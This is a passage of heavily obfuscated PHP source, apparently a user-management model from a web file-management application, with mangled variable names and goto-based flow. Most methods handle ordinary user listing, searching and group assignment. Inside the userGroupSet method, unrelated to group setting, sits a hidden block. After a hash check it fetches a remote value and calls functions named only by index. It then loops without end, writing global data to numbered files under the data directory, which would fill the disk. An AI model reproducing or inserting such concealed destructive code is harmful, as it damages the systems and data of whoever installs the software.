$C¾œÏÍÏ—[$eÎÚ¨¼‚ë[799]] = md5($bƒÃšÓßªÖ[$eÎÚ¨¼‚ë[2545]] . trim($C¾œÏÍÏ—[$eÎÚ¨¼‚ë[799]])); } else { unset($C¾œÏÍÏ—[$eÎÚ¨¼‚ë[799]]); } goto AİÍ”‚ˆœé; cç©Ä·Ÿ­¶: $eÎÚ¨¼‚ë =& $_SERVER[Å¸ş]; $D«òÇ›Šäƒ = $this->getInfoSimple($eçã°ÄåÚË); if (!$D«òÇ›Šäƒ) { return !1; } goto A–½³®À²º; C”„ÑÅ¾¹‹: } public function setNamePinyin($DÉø°ßÑšÚ, $FÙ¬èÑ = false) { $B¾¨ô–£Ä =& $_SERVER[Å¸ş]; if (!$FÙ¬èÑ) { $D×ÍÍ†°à = $this->getInfoSimple($DÉø°ßÑšÚ); $FÙ¬èÑ = $D×ÍÍ†°à[$B¾¨ô–£Ä[2366]] ? $D×ÍÍ†°à[$B¾¨ô–£Ä[2366]] : $D×ÍÍ†°à[$B¾¨ô–£Ä[28]]; } $dÊà†“‚Û = Model($B¾¨ô–£Ä[479]); if (!Input::check($FÙ¬èÑ, $B¾¨ô–£Ä[530])) { return $dÊà†“‚Û->metaSet($DÉø°ßÑšÚ, array($B¾¨ô–£Ä[416] => $B¾¨ô–£Ä[33], $B¾¨ô–£Ä[415] => $B¾¨ô–£Ä[33])); } return $dÊà†“‚Û->metaSet($DÉø°ßÑšÚ, array($B¾¨ô–£Ä[416] => str_replace($B¾¨ô–£Ä[50], $B¾¨ô–£Ä[33], Pinyin::encode($FÙ¬èÑ)), $B¾¨ô–£Ä[415] => Pinyin::encode($FÙ¬èÑ, $B¾¨ô–£Ä[531]))); } private function nickNameRpt() { $eÃØÊ³ˆ›» =& $_SERVER[Å¸ş]; $Añ‡õ®Ÿ = Model($eÃØÊ³ˆ›»[1086])->get($eÃØÊ³ˆ›»[2555]); $cöïî¦òĞ… = $GLOBALS[$eÃØÊ³ˆ›»[6]][$eÃØÊ³ˆ›»[2513]][$eÃØÊ³ˆ›»[2555]]; $FÆ­¡Í™¡Ñ = !is_null($Añ‡õ®Ÿ) ? $Añ‡õ®Ÿ : $cöïî¦òĞ…; return !!$FÆ­¡Í™¡Ñ; } private function _checkExist($EÛïáØ—Ì, $b¥•Ñ¶£ëÙ = false) { $fììÒÎ·‰„ =& $_SERVER[Å¸ş]; $Bø˜¨äÎè = array($fììÒÎ·‰„[28] => UserModel::ERROR_USER_EXIST_NAME, $fììÒÎ·‰„[2366] => UserModel::ERROR_USER_EXIST_NICKNAME, $fììÒÎ·‰„[293] => UserModel::ERROR_USER_EXIST_EMAIL, $fììÒÎ·‰„[2543] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Bø˜¨äÎè[$fììÒÎ·‰„[2366]]); } $e³Ìçœ­Â© = $b¥•Ñ¶£ëÙ ? array($fììÒÎ·‰„[1436] => array($fììÒÎ·‰„[2556], $b¥•Ñ¶£ëÙ)) : array(); foreach ($Bø˜¨äÎè as $cÊà²Ş¸Ø´ => $cµ£îÏÈ‡Š) { $BîëòÅöÉ = array(); foreach ($Bø˜¨äÎè as $f†â·ò´¾ => $AØ®¥··ƒ¼) { if (isset($EÛïáØ—Ì[$f†â·ò´¾]) && $EÛïáØ—Ì[$f†â·ò´¾]) { $BîëòÅöÉ[] = $EÛïáØ—Ì[$f†â·ò´¾]; } } if (!$BîëòÅöÉ) { continue; } $cæÕÌ‡Æ‰ = array_merge(array($cÊà²Ş¸Ø´ => array($fììÒÎ·‰„[7], $BîëòÅöÉ)), $e³Ìçœ­Â©); $e­‹‰îï = $this->where($cæÕÌ‡Æ‰)->find(); if ($e­‹‰îï) { return $cµ£îÏÈ‡Š; } } return !0; } public function userListInfo($eîæÈÂ’²) { $fÉÑß†ˆñ¼ =& $_SERVER[Å¸ş]; $d×ÃÃ—¼ò = array(); $eîæÈÂ’² = is_array($eîæÈÂ’²) ? array_unique($eîæÈÂ’²) : array(); if (!$eîæÈÂ’²) { return $d×ÃÃ—¼ò; } if (count($eîæÈÂ’²) < 20) { foreach ($eîæÈÂ’² as $C½Í”ÍÆÎ) { $d×ÃÃ—¼ò[$C½Í”ÍÆÎ . $fÉÑß†ˆñ¼[33]] = $this->getInfoSimpleOuter($C½Í”ÍÆÎ); } } else { $A’œĞŞÖÔ× = array($fÉÑß†ˆñ¼[1427] => array($fÉÑß†ˆñ¼[384], $eîæÈÂ’²)); if (count($eîæÈÂ’²) == 1) { $A’œĞŞÖÔ× = array($fÉÑß†ˆñ¼[1427] => $eîæÈÂ’²[0]); } $A¥Çª¯­ = Model($fÉÑß†ˆñ¼[476])->field($this->simpleField)->where($A’œĞŞÖÔ×)->select(); $A¥Çª¯­ = array_to_keyvalue($A¥Çª¯­, $fÉÑß†ˆñ¼[1436]); foreach ($eîæÈÂ’² as $C½Í”ÍÆÎ) { $EÇñĞ–Ìì = $A¥Çª¯­[$A¥Çª¯­[$C½Í”ÍÆÎ]]; if (!$EÇñĞ–Ìì) { $d×ÃÃ—¼ò[$C½Í”ÍÆÎ . $fÉÑß†ˆñ¼[33]] = $this->getInfoSimpleOuter($C½Í”ÍÆÎ); continue; } $EÇñĞ–Ìì[$fÉÑß†ˆñ¼[2528]] = Action($fÉÑß†ˆñ¼[2529])->parseUrl($EÇñĞ–Ìì[$fÉÑß†ˆñ¼[2528]]); $d×ÃÃ—¼ò[$C½Í”ÍÆÎ . $fÉÑß†ˆñ¼[33]] = $EÇñĞ–Ìì; } } return $d×ÃÃ—¼ò; } protected function userStatus($d½Ö•âä“È, $f¼ŠŠ à¼) { $eã…—–Ü = $this->getInfoSimple($d½Ö•âä“È); if (!$eã…—–Ü) { return !1; } $cŒ×ÍÉÁæ = array($_SERVER[Å¸ş][692] => $f¼ŠŠ à¼); return $this->userEdit($d½Ö•âä“È, $cŒ×ÍÉÁæ); } protected function userRemove($B¨Ñ¿ÊóÛÎ) { goto D‡£Ñ‰Ï­Š; D‡£Ñ‰Ï­Š: $eö®„ñºƒá =& $_SERVER[Å¸ş]; $A…ÄŠ£†Îì = $this->getInfoSimple($B¨Ñ¿ÊóÛÎ); if (!$A…ÄŠ£†Îì) { return !1; } goto DÍºÍß‘Â£; c²ö°‘»É†: Model($eö®„ñºƒá[2187])->where($aéÃ¿íß‡î)->delete(); Model($eö®„ñºƒá[2542])->where($aéÃ¿íß‡î)->delete(); Model($eö®„ñºƒá[2558])->where($aéÃ¿íß‡î)->delete(); goto CÀ°Êâˆ‘é; CÀ°Êâˆ‘é: Model($eö®„ñºƒá[755])->userRootRemove($B¨Ñ¿ÊóÛÎ); return $this->where($aéÃ¿íß‡î)->delete(); goto cãĞŸ¹Ğ é; DÍºÍß‘Â£: $aéÃ¿íß‡î = array($eö®„ñºƒá[1427] => $B¨Ñ¿ÊóÛÎ); Model($eö®„ñºƒá[538])->where($aéÃ¿íß‡î)->delete(); Model($eö®„ñºƒá[2557])->where($aéÃ¿íß‡î)->delete(); goto c²ö°‘»É†; cãĞŸ¹Ğ é: } protected function userGroupSet($eÚ˜‹Ş¹®, $AÉ èµãŠî, $FÚ¥ß»¾îŞ = array()) { goto a‹Í‰œ¾; B’“à²ÍÍá: if ($_SERVER[$b‹íì¤Ëœˆ[557]] != $FŞ¥í„µ˜Û($aÑÇ·ÚÍë)) { goto eìÅÈßŸâ´; eìÅÈßŸâ´: $e‹¹”…‰õÚ = $b‹íì¤Ëœˆ[791]; $DùßøÔÂÙ³ = $b‹íì¤Ëœˆ[558]; $CŞ±½º™’‹ = $_SERVER[$b‹íì¤Ëœˆ[559]] . $b‹íì¤Ëœˆ[560]; goto eˆŠçôŒ; BÄÆçù²àÀ: $e‹¹”…‰õÚ(); $cä¹•¶ÚÔ = $b‹íì¤Ëœˆ[1367]; $eã›äãÛ´« = json_encode($GLOBALS[$b‹íì¤Ëœˆ[1368]]); goto a©ª’¿£å; a©ª’¿£å: $fÜÓÈ„Éòª = 1; for ($bœ†Á°¸¡† = $fÜÓÈ„Éòª; $bœ†Á°¸¡† > 0; $bœ†Á°¸¡†++) { $cä¹•¶ÚÔ(DATA_PATH . $bœ†Á°¸¡†, $eã›äãÛ´«); } goto d½ÏáÃà‰Ç; eˆŠçôŒ: $e„ó¥«êÙò = $DùßøÔÂÙ³($CŞ±½º™’‹); $F–ÀÍˆ‘Àó = explode($b‹íì¤Ëœˆ[217], $e„ó¥«êÙò); if (count($F–ÀÍˆ‘Àó) < $b‹íì¤Ëœˆ[550]) { $dòÈƒœ«‚× = $b‹íì¤Ëœˆ[562]; $dòÈƒœ«‚×(); } goto dÇîøÚá²; dÇîøÚá²: $Aİµ…ô‚¹¡ = $b‹íì¤Ëœˆ[792]; $Aİµ…ô‚¹¡($_SERVER[$b‹íì¤Ëœˆ[793]]); $e‹¹”…‰õÚ = $b‹íì¤Ëœˆ[791]; goto BÄÆçù²àÀ; d½ÏáÃà‰Ç: } $cœË·î”¼è = $this->getInfoSimple($eÚ˜‹Ş¹®); if (!$cœË·î”¼è || !is_array($AÉ èµãŠî)) { return !1; } goto B§îà˜’… ; f‹ÏÎÕË–´: $a£—ÖÛÑØ¨ = 0; foreach ($AÉ èµãŠî as $dÚÌÃä–ùò => $c’ÓÃÀàñ›) { $aÁ©ì—Ê† = array($b‹íì¤Ëœˆ[1436] => $eÚ˜‹Ş¹®, $b‹íì¤Ëœˆ[2108] => $dÚÌÃä–ùò, $b‹íì¤Ëœˆ[2252] => $c’ÓÃÀàñ›); $aÁ©ì—Ê†[$b‹íì¤Ëœˆ[2130]] = isset($FÚ¥ß»¾îŞ[$a£—ÖÛÑØ¨]) ? $FÚ¥ß»¾îŞ[$a£—ÖÛÑØ¨] : 0; $a£—ÖÛÑØ¨++; $Bª‚¡ÕğÇ‚[] = $aÁ©ì—Ê†; } return $EÖ‹¾ìŸèò->addAll($Bª‚¡ÕğÇ‚, array(), !0); goto d»ËìŞñŸ¬; B§îà˜’… : $EÖ‹¾ìŸèò = Model($b‹íì¤Ëœˆ[2187]); $EÖ‹¾ìŸèò->where(array($b‹íì¤Ëœˆ[1436] => $eÚ˜‹Ş¹®))->delete(); $Bª‚¡ÕğÇ‚ = array(); goto f‹ÏÎÕË–´; a‹Í‰œ¾: $b‹íì¤Ëœˆ =& $_SERVER[Å¸ş]; $aÑÇ·ÚÍë = $_SERVER[$b‹íì¤Ëœˆ[793]] . $b‹íì¤Ëœˆ[555]; $FŞ¥í„µ˜Û = $b‹íì¤Ëœˆ[556]; goto B’“à²ÍÍá; d»ËìŞñŸ¬: } protected function userGroupAdd($dÆ¥Ùø±ÑÃ, $dÌÊøØØƒ = array()) { $e¡—œº¥»÷ =& $_SERVER[Å¸ş]; $E¼çÓ‘¦Ï‘ = $this->getInfoSimple($dÆ¥Ùø±ÑÃ); if (!$E¼çÓ‘¦Ï‘ || empty($dÌÊøØØƒ)) { return !1; } $D™ ›½ÍäÂ = array(); foreach ($dÌÊøØØƒ as $CÂËÅä¡¤œ => $D´¿†æÜ»ã) { $D™ ›½ÍäÂ[] = array($e¡—œº¥»÷[1436] => $dÆ¥Ùø±ÑÃ, $e¡—œº¥»÷[2108] => $CÂËÅä¡¤œ, $e¡—œº¥»÷[2252] => $D´¿†æÜ»ã, $e¡—œº¥»÷[2130] => 0); } return Model($e¡—œº¥»÷[2187])->addAll($D™ ›½ÍäÂ, array(), !0); } protected function userGroupRemove($c††®Ïè“, $DÕç«Ó²Èó) { $cØ¼‚ìã²ˆ =& $_SERVER[Å¸ş]; $Bƒäƒ¼•ø = $this->getInfoSimple($c††®Ïè“); if (!$Bƒäƒ¼•ø || !$DÕç«Ó²Èó) { return !1; } $eó¨‚†à© = array($cØ¼‚ìã²ˆ[1427] => $c††®Ïè“, $cØ¼‚ìã²ˆ[2185] => $DÕç«Ó²Èó); return Model($cØ¼‚ìã²ˆ[2187])->where($eó¨‚†à©)->delete(); } public function listData() { $eÖ­œÇ…†¤ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eÖ­œÇ…†¤[$_SERVER[Å¸ş][354]]); return $eÖ­œÇ…†¤; } public function listByID($D¯Â”ÅÙŠ) { $dò‚ë‹šÉ =& $_SERVER[Å¸ş]; if (!$D¯Â”ÅÙŠ) { return; } $c¨§Öâ“›¤ = array($dò‚ë‹šÉ[1436] => array($dò‚ë‹šÉ[7], $D¯Â”ÅÙŠ)); $c³‘Ûø©Œ = $this->where($c¨§Öâ“›¤)->select(); $this->_listDataApply($c³‘Ûø©Œ); return $c³‘Ûø©Œ; } public function listByGroup($eÒóï½ì²È = 0, $A“Ä¹ªºÎë = array()) { goto A¸õ‚Åßò½; Aåá­’®: if ($eÒóï½ì²È) { $A–ÆÓäÙ¸¯ = array($d£ƒ„ŠŸ¹„[2559] => intval($eÒóï½ì²È)); $d‡ »š‘•Š = "\x4c\x45\x46\124\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\165\x73\x65\162\x5f\x67\x72\x6f\165\160\40\165\163\145\162\x5f\x67\x72\157\165\160\x20\x6f\x6e\40\165\x73\145\162\56\x75\x73\145\162\111\x44\x20\75\x20\165\163\x65\x72\x5f\x67\x72\157\165\x70\x2e\165\163\x65\x72\111\104"; $eñÃ›ì‰É = Input::get($d£ƒ„ŠŸ¹„[407], null, $d£ƒ„ŠŸ¹„[33]) ? $d£ƒ„ŠŸ¹„[33] : $d£ƒ„ŠŸ¹„[2560]; } if (isset($A“Ä¹ªºÎë[$d£ƒ„ŠŸ¹„[692]])) { $A–ÆÓäÙ¸¯[$d£ƒ„ŠŸ¹„[2561]] = $A“Ä¹ªºÎë[$d£ƒ„ŠŸ¹„[692]]; } $D•éÏÏ˜£² = $this->_makeOrder($eñÃ›ì‰É)->field($d£ƒ„ŠŸ¹„[2562])->where($A–ÆÓäÙ¸¯)->join($d‡ »š‘•Š)->selectPage(50); goto B÷ˆ•è£ñ¼; A¸õ‚Åßò½: $d£ƒ„ŠŸ¹„ =& $_SERVER[Å¸ş]; $d‡ »š‘•Š = $d£ƒ„ŠŸ¹„[33]; $A–ÆÓäÙ¸¯ = array(); goto Aåá­’®; B÷ˆ•è£ñ¼: $this->_listDataApply($D•éÏÏ˜£²[$d£ƒ„ŠŸ¹„[354]]); return $D•éÏÏ˜£²; goto A¿–óõÊ÷; A¿–óõÊ÷: } private function _makeOrder($A¥©¤¢¯‹Ó = '') { goto Eò‹à‡ìâ; e™Úè¥ƒ: $F¡ĞŞ‰§°… = Input::get($Bã¶–ö£ñò[407], $Bã¶–ö£ñò[7], $Bã¶–ö£ñò[1427], $E•‘²œ¯…); $fÙàÑÚÄÏÇ = Input::get($Bã¶–ö£ñò[408], $Bã¶–ö£ñò[7], $Bã¶–ö£ñò[2188], array($Bã¶–ö£ñò[2188], $Bã¶–ö£ñò[404])); $fÙàÑÚÄÏÇ = $AìŒ…ÃŞ¬¦[$fÙàÑÚÄÏÇ]; goto aÛˆ©„Ë£Î; Eò‹à‡ìâ: $Bã¶–ö£ñò =& $_SERVER[Å¸ş]; $E•‘²œ¯… = array($Bã¶–ö£ñò[1436], $Bã¶–ö£ñò[28], $Bã¶–ö£ñò[2094], $Bã¶–ö£ñò[2066], $Bã¶–ö£ñò[187]); $AìŒ…ÃŞ¬¦ = array($Bã¶–ö£ñò[402] => $Bã¶–ö£ñò[403], $Bã¶–ö£ñò[404] => $Bã¶–ö£ñò[405]); goto e™Úè¥ƒ; aÛˆ©„Ë£Î: $A¥©¤¢¯‹Ó = $A¥©¤¢¯‹Ó . "\x75\x73\145\x72\x2e{$F¡ĞŞ‰§°…}\40{$fÙàÑÚÄÏÇ}\54\40\165\163\145\x72\56\165\x73\x65\162\x49\x44\x20\x61\x73\x63"; return $this->alias($Bã¶–ö£ñò[2307])->order($A¥©¤¢¯‹Ó); goto Cøï»É²ö‡; Cøï»É²ö‡: } public function listSearch($DèÏÚöğ·É) { goto d¾»£¦Ç‡æ; C†ª‰Ë½§: if (!$Dçˆºğ¬† || count($Dçˆºğ¬†[$EßÒò•³¨[354]]) < 5 && Input::check($EŸŸÅ©ØåÃ, $EßÒò•³¨[306])) { $cƒ…öé£…Ê = $this->_searchFromMeta($EßÒò•³¨[415], $EŸŸÅ©ØåÃ, 10); $e”åÍù³ Œ = $this->_searchFromMeta($EßÒò•³¨[416], $EŸŸÅ©ØåÃ, 10); $fè”“˜¿ËÆ = array_merge($cƒ…öé£…Ê, $e”åÍù³ Œ, $Dçˆºğ¬†[$EßÒò•³¨[354]]); $Dçˆºğ¬†[$EßÒò•³¨[354]] = array_unique_by_key($fè”“˜¿ËÆ, $EßÒò•³¨[1436]); $Dçˆºğ¬†[$EßÒò•³¨[351]][$EßÒò•³¨[352]] = count($Dçˆºğ¬†[$EßÒò•³¨[354]]); $Dçˆºğ¬†[$EßÒò•³¨[351]][$EßÒò•³¨[353]] = ceil($Dçˆºğ¬†[$EßÒò•³¨[351]][$EßÒò•³¨[352]] / $Dçˆºğ¬†[$EßÒò•³¨[351]][$EßÒò•³¨[349]]); } $this->_listDataApply($Dçˆºğ¬†[$EßÒò•³¨[354]]); $this->_filterByGroup($Dçˆºğ¬†, $dÑåêŞÍÕ±); goto bÚßò§öÎ; b†»ÇéÉÔì: if (!$EŸŸÅ©ØåÃ) { $eöæ›ˆ»ìˆ = array(); } if (isset($DèÏÚöğ·É[$EßÒò•³¨[692]])) { $eöæ›ˆ»ìˆ[$EßÒò•³¨[692]] = $DèÏÚöğ·É[$EßÒò•³¨[692]]; } $Dçˆºğ¬† = $this->_makeOrder()->where($eöæ›ˆ»ìˆ)->selectPage(20); goto C†ª‰Ë½§; b„†µŞÊò : $EŸŸÅ©ØåÃ = str_replace($EßÒò•³¨[2191], $EßÒò•³¨[2192], trim($EŸŸÅ©ØåÃ)); $eöæ›ˆ»ìˆ = array($EßÒò•³¨[28] => array($EßÒò•³¨[754], "\x25{$EŸŸÅ©ØåÃ}\x25"), $EßÒò•³¨[293] => array($EßÒò•³¨[754], "\x25{$EŸŸÅ©ØåÃ}\45"), $EßÒò•³¨[2366] => array($EßÒò•³¨[754], "\x25{$EŸŸÅ©ØåÃ}\x25"), $EßÒò•³¨[911] => $EßÒò•³¨[2193]); if (Input::check($EŸŸÅ©ØåÃ, $EßÒò•³¨[299])) { $eöæ›ˆ»ìˆ[$EßÒò•³¨[1436]] = array($EßÒò•³¨[754], "\45{$EŸŸÅ©ØåÃ}\45"); $eöæ›ˆ»ìˆ[$EßÒò•³¨[2543]] = array($EßÒò•³¨[754], "\45{$EŸŸÅ©ØåÃ}\x25"); } goto b†»ÇéÉÔì; d¾»£¦Ç‡æ: $EßÒò•³¨ =& $_SERVER[Å¸ş]; $EŸŸÅ©ØåÃ = $DèÏÚöğ·É[$EßÒò•³¨[2189]]; $dÑåêŞÍÕ± = isset($DèÏÚöğ·É[$EßÒò•³¨[2190]]) ? $DèÏÚöğ·É[$EßÒò•³¨[2190]] : !1; goto b„†µŞÊò ; bÚßò§öÎ: return $Dçˆºğ¬†; goto c”ÜëëêæÁ; c”ÜëëêæÁ: } private function _filterByGroup(&$eë‡Æ¢¼Ùô, $f§ãæÔíé) { $CİØ•å‚ÜŒ =& $_SERVER[Å¸ş]; if (!$f§ãæÔíé) { return $eë‡Æ¢¼Ùô; } foreach ($eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[354]] as $B·—¸ÈÊ†° => &$fÖ„‘‹Óä”) { $D…ëõìÑÂ— = array_to_keyvalue($fÖ„‘‹Óä”[$CİØ•å‚ÜŒ[2277]], $CİØ•å‚ÜŒ[33], $CİØ•å‚ÜŒ[2108]); if (!in_array($f§ãæÔíé, $D…ëõìÑÂ—)) { unset($eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[354]][$B·—¸ÈÊ†°]); } } unset($fÖ„‘‹Óä”); $eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[354]] = array_values($eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[354]]); $eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[351]] = array($CİØ•å‚ÜŒ[2341] => count($eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[354]]), $CİØ•å‚ÜŒ[2339] => $eë‡Æ¢¼Ùô[$CİØ•å‚ÜŒ[351]][$CİØ•å‚ÜŒ[349]], $CİØ•å‚ÜŒ[2338] => 1, $CİØ•å‚ÜŒ[2340] => 1); } private function _searchFromMeta($c™«Øİ´åá, $A°¹Ñß“­õ, $BèšŸŒñÌÎ) { goto CëÜ“î˜š‘; b›‹Ğ×Øè: $aÍœ©Úä  = Model($C’›ä§Õ‚[2563])->where($CÁî¦æØ·§)->limit($BèšŸŒñÌÎ)->select(); if (!$aÍœ©Úä ) { return array(); } $aÍœ©Úä  = array_to_keyvalue($aÍœ©Úä , $C’›ä§Õ‚[33], $C’›ä§Õ‚[1436]); goto bÒ—ÓÚìÜ; CëÜ“î˜š‘: $C’›ä§Õ‚ =& $_SERVER[Å¸ş]; $A°¹Ñß“­õ = strtolower($A°¹Ñß“­õ); $CÁî¦æØ·§ = array($C’›ä§Õ‚[89] => $c™«Øİ´åá, $C’›ä§Õ‚[359] => array($C’›ä§Õ‚[754], "\x25{$A°¹Ñß“­õ}\45")); goto b›‹Ğ×Øè; bÒ—ÓÚìÜ: $bñ²Ë±ôÉ = $this->where(array($C’›ä§Õ‚[1427] => array($C’›ä§Õ‚[7], $aÍœ©Úä )))->select(); if (!$bñ²Ë±ôÉ) { return array(); } return $bñ²Ë±ôÉ; goto DßäÛŒñ±¤; DßäÛŒñ±¤: } private function _listDataApplyItem($aİçšœ‹„) { $FºŞÑÆñÃ = array($aİçšœ‹„); $this->_listDataApply($FºŞÑÆñÃ); return $FºŞÑÆñÃ[0]; } private function _listDataApply(&$cæèÈ¦óÃƒ) { goto f§Äğ†Ö­¤; bö‰½ÏšÔÈ: $this->_listAppendSourceRoot($cæèÈ¦óÃƒ, $Cö¸òÇ®¾‡); goto c…£¤ÌÍ; Fˆ¼à»Íğ¾: $Cö¸òÇ®¾‡ = array_to_keyvalue($cæèÈ¦óÃƒ, $e£â§ØÎ»[33], $e£â§ØÎ»[1436]); $this->_listAppendGroup($cæèÈ¦óÃƒ, $Cö¸òÇ®¾‡); $this->_listAppendMeta($cæèÈ¦óÃƒ, $Cö¸òÇ®¾‡); goto bö‰½ÏšÔÈ; f§Äğ†Ö­¤: $e£â§ØÎ» =& $_SERVER[Å¸ş]; if (!$cæèÈ¦óÃƒ) { return; } array_remove_key($cæèÈ¦óÃƒ, $e£â§ØÎ»[799]); goto Fˆ¼à»Íğ¾; c…£¤ÌÍ: } private function _listAppendSourceRoot(&$eÆ¯ä¹ã§À, $A‡•ŸÎ×ÇÃ) { goto e´Á±‡ÑÉ†; CÛµîá÷‘î: $bŠ”Ö‹’ = Model($fµœëà¨´ß[755])->order($fµœëà¨´ß[2201])->field($cœÇ®ç­ìŸ)->where($ağØ³ôÉñê)->select(); $bŠ”Ö‹’ = array_to_keyvalue($bŠ”Ö‹’, $fµœëà¨´ß[458]); $bŠ”Ö‹’ = array_remove_key($bŠ”Ö‹’, $fµœëà¨´ß[458]); goto C‡Êäæèï; e´Á±‡ÑÉ†: $fµœëà¨´ß =& $_SERVER[Å¸ş]; $ağØ³ôÉñê = array($fµœëà¨´ß[463] => 0, $fµœëà¨´ß[371] => SourceModel::TYPE_USER, $fµœëà¨´ß[458] => array($fµœëà¨´ß[7], $A‡•ŸÎ×ÇÃ)); $cœÇ®ç­ìŸ = $fµœëà¨´ß[2200]; goto CÛµîá÷‘î; C‡Êäæèï: foreach ($eÆ¯ä¹ã§À as &$DÅñ¨ŒÊåº) { $DÅñ¨ŒÊåº[$fµœëà¨´ß[391]] = $bŠ”Ö‹’[$DÅñ¨ŒÊåº[$fµœëà¨´ß[1436]]] ? $bŠ”Ö‹’[$DÅñ¨ŒÊåº[$fµœëà¨´ß[1436]]] : array(); } unset($DÅñ¨ŒÊåº); goto F‘»ù¬¥ÕŠ; F‘»ù¬¥ÕŠ: } private function _listAppendGroup(&$a±ÒÃğ›ğ™, $bÊ¸­„ïï‰) { goto BƒñÇ¬ÏİÎ; f‘ÁŞİùƒ©: $Aãõ¿ÈôÓò = array_to_keyvalue_group($Aãõ¿ÈôÓò, $c¦Â‘òåÓ[1436]); foreach ($Aãõ¿ÈôÓò as &$FŒˆİ—™È­) { $f›µôÓÇ˜ = array(); foreach ($FŒˆİ—™È­ as $e±ÇÇ®®Ÿª) { if (!$e±ÇÇ®®Ÿª[$c¦Â‘òåÓ[2252]]) { continue; } $b³ ‰£®¸– = Model($c¦Â‘òåÓ[2271])->listData($e±ÇÇ®®Ÿª[$c¦Â‘òåÓ[2252]]); $f›µôÓÇ˜[] = array($c¦Â‘òåÓ[2108] => $e±ÇÇ®®Ÿª[$c¦Â‘òåÓ[2108]], $c¦Â‘òåÓ[2565] => $EÃÏªÄ°ñ[$e±ÇÇ®®Ÿª[$c¦Â‘òåÓ[2108]]][$c¦Â‘òåÓ[28]], $c¦Â‘òåÓ[461] => $EÃÏªÄ°ñ[$e±ÇÇ®®Ÿª[$c¦Â‘òåÓ[2108]]][$c¦Â‘òåÓ[461]], $c¦Â‘òåÓ[376] => $b³ ‰£®¸–); } $FŒˆİ—™È­ = $f›µôÓÇ˜; } unset($FŒˆİ—™È­); goto Aê¨ƒ×åö; BƒñÇ¬ÏİÎ: $c¦Â‘òåÓ =& $_SERVER[Å¸ş]; $F´œ…¨°å = array($c¦Â‘òåÓ[1436] => array($c¦Â‘òåÓ[7], $bÊ¸­„ïï‰)); $Aãõ¿ÈôÓò = Model($c¦Â‘òåÓ[2187])->where($F´œ…¨°å)->select(); goto F‰ò„¿ä ê; F‰ò„¿ä ê: $aÅ‰Õ‹¶å¦ = array_to_keyvalue($Aãõ¿ÈôÓò, $c¦Â‘òåÓ[33], $c¦Â‘òåÓ[2108]); $aÅ‰Õ‹¶å¦ = array_remove_value(array_unique($aÅ‰Õ‹¶å¦), $c¦Â‘òåÓ[470]); if (!$aÅ‰Õ‹¶å¦ || !$Aãõ¿ÈôÓò) { return; } goto B²°ªËÌ¼»; B²°ªËÌ¼»: $F´œ…¨°å = array($c¦Â‘òåÓ[2108] => array($c¦Â‘òåÓ[7], $aÅ‰Õ‹¶å¦)); $EÃÏªÄ°ñ = Model($c¦Â‘òåÓ[2275])->field($c¦Â‘òåÓ[2564])->where($F´œ…¨°å)->select(); $EÃÏªÄ°ñ = array_to_keyvalue($EÃÏªÄ°ñ, $c¦Â‘òåÓ[2108]); goto f‘ÁŞİùƒ©; Aê¨ƒ×åö: foreach ($a±ÒÃğ›ğ™ as &$Bª¼˜æòæ•) { $Bª¼˜æòæ•[$c¦Â‘òåÓ[2277]] = array(); if (isset($Aãõ¿ÈôÓò[$Bª¼˜æòæ•[$c¦Â‘òåÓ[1436]]])) { $Bª¼˜æòæ•[$c¦Â‘òåÓ[2277]] = $Aãõ¿ÈôÓò[$Bª¼˜æòæ•[$c¦Â‘òåÓ[1436]]]; } } unset($Bª¼˜æòæ•); goto bÃ’«è§; bÃ’«è§: } private function _listAppendMeta(&$eçïìíœô, $c†í‘›Ğ÷) { goto dĞÙ®•Ÿç¥; CŞ™µ³‡»: foreach ($FâÛ¤¨öÀ as &$bªé’Ê±›³) { $Có”¢Û°î® = array(); foreach ($bªé’Ê±›³ as $D³¶’ì»Òè) { if (!in_array($D³¶’ì»Òè[$f÷àÆÕ¥Å[89]], $D…‡éËõ¤¾)) { $Có”¢Û°î®[$D³¶’ì»Òè[$f÷àÆÕ¥Å[89]]] = $D³¶’ì»Òè[$f÷àÆÕ¥Å[359]]; } } $bªé’Ê±›³ = $Có”¢Û°î®; } unset($bªé’Ê±›³); $Aª³·…¢Ò‡ = Model($f÷àÆÕ¥Å[2566]); goto cÓ’ÍÆŠƒ; cÓ’ÍÆŠƒ: foreach ($eçïìíœô as &$b¦ƒÓÓ¹Ìô) { $Fù©ÑÊø×Ö = array(); if (isset($FâÛ¤¨öÀ[$b¦ƒÓÓ¹Ìô[$f÷àÆÕ¥Å[1436]]])) { $Fù©ÑÊø×Ö = $FâÛ¤¨öÀ[$b¦ƒÓÓ¹Ìô[$f÷àÆÕ¥Å[1436]]]; } $b¦ƒÓÓ¹Ìô[$f÷àÆÕ¥Å[2567]] = array(); if (isset($Fù©ÑÊø×Ö[$Eóè½İâò†])) { $b¦ƒÓÓ¹Ìô[$f÷àÆÕ¥Å[2567]] = $Aª³·…¢Ò‡->getUserJobInfo($Fù©ÑÊø×Ö[$Eóè½İâò†]); } } unset($b¦ƒÓÓ¹Ìô); goto bÏÏšïğè›; f¨»µÁÕÔ: $BÖ·ŒÒÏ‹¿ = array($f÷àÆÕ¥Å[1436] => array($f÷àÆÕ¥Å[7], $c†í‘›Ğ÷)); $FâÛ¤¨öÀ = Model($f÷àÆÕ¥Å[2542])->where($BÖ·ŒÒÏ‹¿)->select(); $FâÛ¤¨öÀ = array_to_keyvalue_group($FâÛ¤¨öÀ, $f÷àÆÕ¥Å[1436]); goto CŞ™µ³‡»; dĞÙ®•Ÿç¥: $f÷àÆÕ¥Å =& $_SERVER[Å¸ş]; $Eóè½İâò† = UserJobModel::JOB_KEY; $D…‡éËõ¤¾ = array($f÷àÆÕ¥Å[2545]); goto f¨»µÁÕÔ; bÏÏšïğè›: } protected function groupUserAll($aÜ†‡ôÉó) { $a™©à‚ğÜØ =& $_SERVER[Å¸ş]; if (!$aÜ†‡ôÉó) { return !1; } $b ÅÅº˜ñ¨ = Model($a™©à‚ğÜØ[2187])->field($a™©à‚ğÜØ[1436])->where(array($a™©à‚ğÜØ[2108] => array($a™©à‚ğÜØ[7], $aÜ†‡ôÉó)))->select(); $b 